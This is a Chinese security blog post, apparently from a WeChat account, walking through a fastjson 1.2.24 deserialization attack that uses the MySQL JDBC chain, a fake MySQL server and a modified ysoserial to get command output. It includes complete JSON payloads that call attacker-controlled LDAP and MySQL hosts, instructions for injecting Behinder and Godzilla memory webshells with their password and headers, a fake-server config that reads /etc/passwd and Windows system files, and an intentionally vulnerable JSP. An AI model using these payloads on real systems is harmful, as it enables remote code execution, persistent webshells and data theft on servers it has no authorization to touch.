#  fastjson中JDBC链回显

原创 f0ng [ only security ](javascript:void\(0\);)

**only security** ![]()

微信号 gh_8f063d2a5255

功能介绍 分享日常笔记、所思所想

____

___发表于_

收录于合集

##todo 1 个

#网络安全 5 个

很久没有更新了，把之前一直想去完成的Todo去做了。

# 0x01 背景

fastjson的JDBC(com.mysql.jdbc.JDBC4Connection)，之前遇到过一次，但是没有弄出来回显的，仅仅只是单次执行命令的。但是听朋友说，他们有专门的工具进行fastjson利用(但是我没有呀)，那会刚好碰到su18大佬发布了修改版的ysoserial，是有回显的扩展攻击链的，感觉这样就可以和fakeMySQL进行一个组合利用了，一直没有时间进行试验，这里简单做个记录。

# 0x02 环境搭建

首先搭建一个fastjson的环境，这里我直接使用shiro的环境搭建，添加上fastjson的依赖

    
    
    <dependency>    
        <groupId>com.alibaba</groupId>    
        <artifactId>fastjson</artifactId>    
        <version>1.2.24</version>    
    </dependency>  
    

由于使用的是JDBC链，所以还要加上JDBC链的依赖，如下：

    
    
    <dependency>    
        <groupId>mysql</groupId>    
        <artifactId>mysql-connector-java</artifactId>    
        <version>5.1.46</version>    
    </dependency>  
    

这里用`CommonsBeanutils1`进行演示，依赖如下：

    
    
    <dependency>    
        <groupId>commons-beanutils</groupId>    
        <artifactId>commons-beanutils</artifactId>    
        <version>1.9.2</version>    
    </dependency>  
    

使用以下代码，就可以直接命令执行：(命令为打开计算器，需要搭建JNDIExploit)

    
    
    import com.alibaba.fastjson.JSON;  
    public class test {    
        public static void main(String[] args){  
          
     String jsonStr = "{\"@type\":\"com.sun.rowset.JdbcRowSetImpl\",\"dataSourceName\":\"ldap://x.x.x.x:1389/Deserialization/CommonsBeanutils1/Command/Base64/b3BlbiAtYSBDYWxjdWxhdG9yLmFwcA==\", \"autoCommit\":true}\n";    
     JSON.parseObject(jsonStr);  
     }  
    }  
    

![](https://gitee.com/fuli009/images/raw/master/public/20220929133336.png)![](https://gitee.com/fuli009/images/raw/master/public/20220929133339.png)

# 0x03 工具用法

fastjson环境搭建完毕，了解一下fakeMySQL与ysoserial用法

## 0x001 fakeMySQL用法

https://github.com/fnmsd/MySQL_Fake_Server

![](https://gitee.com/fuli009/images/raw/master/public/20220929133341.png)

得到两点关键信息

  1. 配置文件进行预定义
  2. 用yso_开头的用户名，配合payload类型、命令 这里我进行了配置，配置文件放在末尾附件中

## 0x002 ysoserial用法(ysuserial)

https://github.com/su18/ysoserial

![](https://gitee.com/fuli009/images/raw/master/public/20220929133343.png)

    
    
    java -jar ysuserial-0.9-su18-all.jar -g CommonsCollections1 -p 'open -a Calculator.app'  
    

-g后面加上payload类型，-p为命令的参数或者为拓展的功能

# 0x04 工具联动

这里需要去调用yso的命令，所以根据之前工具的用法可以传入`yso_-g CommonsBeanutils1_-p EX-TomcatEcho`

根据以上，可以使用JDBC链，payload如下：

    
    
    {"x":{"@type":"java.lang.AutoCloseable","@type":"com.mysql.jdbc.JDBC4Connection","hostToConnectTo":"x.x.x.x","portToConnectTo":3308,"info":{"user":"yso_-g CommonsBeanutils1_-p EX-TomcatEcho","password":"ubuntu","useSSL":"false","statementInterceptors":"com.mysql.jdbc.interceptors.ServerStatusDiffInterceptor","autoDeserialize":"true"},"databaseToConnectTo":"mysql","url":""}}  
    

但是在利用的时候遇到了点问题

![](https://gitee.com/fuli009/images/raw/master/public/20220929133344.png)

发现可能是将`' CommonsBeanutils1'`作为参数传入了`ysuserial.jar`一样的报错

![](https://gitee.com/fuli009/images/raw/master/public/20220929133346.png)

查看`fakeMySQL`端的完整命令

![](https://gitee.com/fuli009/images/raw/master/public/20220929133349.png)

去看server.py源码，发现这里是直接获取到`yso_type`参数传入`subprocess.Popen`函数

![](https://gitee.com/fuli009/images/raw/master/public/20220929133352.png)![](https://gitee.com/fuli009/images/raw/master/public/20220929133353.png)

对`subprocess.Popen`函数进行测试：

![](https://gitee.com/fuli009/images/raw/master/public/20220929133354.png)

就是这里参数的问题了，后续发现，可以将`-g
CommonsBeanutils1`变成`-gCommonsBeanutils1`，这样ysoserial也可以正常工作

这里将用户名改成`yso_-gCommonsBeanutils1_-p EX-TomcatEcho`就可以了(当然，`yso_-
gCommonsBeanutils1_-pEX-TomcatEcho`也可行)

`X-Token-Data: whoami`作为命令输入点

![](https://gitee.com/fuli009/images/raw/master/public/20220929133355.png)

得到了命令回显

当然，还可以使用`EX-MS-TSMSFromThread-bx`模块进行注入冰蝎马，即可链接 密码为`su18`请求头为:

    
    
    Referer: http://su18.org/  
    X-SSRF-TOKEN: bx  
    

![](https://gitee.com/fuli009/images/raw/master/public/20220929133357.png)![](https://gitee.com/fuli009/images/raw/master/public/20220929133358.png)

也可以注入哥斯拉内存马等等，包括最近比较火的Upgrade内存马、Executor内存马、Websocket内存马等，作者都进行了更新，不过貌似没有完全利用，期待作者后续更新

# 0x05 附件:

  1. 假MYSQL服务器的配置如下 config.json

    
    
    {  
        "config":{  
            "ysoserialPath":"ysuserial.jar",  
            "javaBinPath":"/usr/local/java8231/jdk1.8.0_231/bin/java8231",  
            "fileOutputDir":"./fileOutput/",  
            "displayFileContentOnScreen":true,  
            "saveToFile":true  
        },  
            "fileread":{  
            "win_ini":"c:\\windows\\win.ini",  
            "win_hosts":"c:\\windows\\system32\\drivers\\etc\\hosts",  
            "win":"c:\\windows\\",  
            "win_1":"c:\\1.txt",  
            "linux_passwd":"/etc/passwd",  
            "linux_hosts":"/etc/hosts",  
            "index_php":"index.php",  
            "ssrf":"x.x.x.x",  
            "__defaultFiles":["/etc/hosts","c:\\windows\\system32\\drivers\\etc\\hosts"]  
        },"yso":{  
            "CommonsBeanutils1":["CommonsBeanutils1",""],  
            "CommonsCollectionsK1":["CommonsCollectionsK1",""]  
        }  
    }  
    

  2. fastjson反序列化测试文件如下：

    
    
    <%@ page import="com.alibaba.fastjson.JSON" %>  
    <%@ page import="java.io.InputStreamReader" %>  
    <%@ page import="java.io.BufferedReader" %>  
      
    <%@ page contentType="text/html;charset=UTF-8" language="java" %>  
    <%--测试fastjson的jdbc链回显--%>  
    <%  
        BufferedReader br = new BufferedReader(new InputStreamReader((ServletInputStream) request.getInputStream(), "utf-8"));  
      
        StringBuffer sb = new StringBuffer("");  
        String temp;  
      
        while ((temp = br.readLine()) != null) {  
            sb.append(temp);  
        }  
      
        br.close();  
        String params = sb.toString();  
        JSON.parseObject(params);  
    %>  
    

直接传入

    
    
    Content-type: application/json  
      
    {"a":"aaaaaa"}  
    

即可

# 0x06 参考

https://github.com/su18/ysoserial [修改版ysoserial]
https://github.com/fnmsd/MySQL_Fake_Server [假Mysql服务器]

  

预览时标签不可点

微信扫一扫  
关注该公众号

[知道了](javascript:;)

微信扫一扫  
使用小程序

****

[取消](javascript:void\(0\);) [允许](javascript:void\(0\);)

****

[取消](javascript:void\(0\);) [允许](javascript:void\(0\);)

： ， 。   视频 小程序 赞 ，轻点两下取消赞 在看 ，轻点两下取消在看

